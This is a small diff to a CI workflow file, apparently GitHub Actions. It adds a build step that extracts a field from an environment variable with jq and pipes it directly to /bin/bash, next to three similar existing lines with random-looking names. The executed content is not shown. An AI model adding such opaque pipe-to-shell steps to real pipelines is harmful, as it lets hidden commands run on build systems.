@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$yv2" | jq -r .gelja2 | /bin/bash
           echo $p5 | jq -r .zebhc24952 | /bin/bash
           echo $qf0 | jq -r .ms6786 | /bin/bash
+          echo $xa09741 | jq -r .au50 | /bin/bash
 
       - name: Archive results
         if: always()
